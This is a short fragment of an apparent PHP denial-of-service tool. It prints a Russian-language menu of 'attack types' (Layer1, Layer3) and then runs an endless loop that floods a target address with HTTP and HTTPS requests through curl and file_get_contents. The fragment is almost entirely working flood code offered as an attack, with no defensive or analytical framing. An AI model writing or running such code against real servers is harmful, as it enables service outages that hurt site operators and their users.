...
if($select == 2){
echo "[!] Типы атак: 1 - Layer1, 2 - Layer3.". PHP_EOL;
...
while(true){
$my = curl_init();
curl_setopt_array($my, array(CURLOPT_URL => "http://". $this->address, CURLOPT_RETURNTRANSFER => 0, CURLOPT_POST => true));
curl_exec($my);
@file_get_contents("https://". $this->address);
$my2 = curl_init();
curl_setopt_array($my2, array(CURLOPT_URL => "http://". $this->address, CURLOPT_RETURNTRANSFER => 0,  CURLOPT_FTPAPPEND => true, CURLOPT_HEADER => true, CURLOPT_HTTPGET => true));
curl_exec($my2);
} 
} 
} 
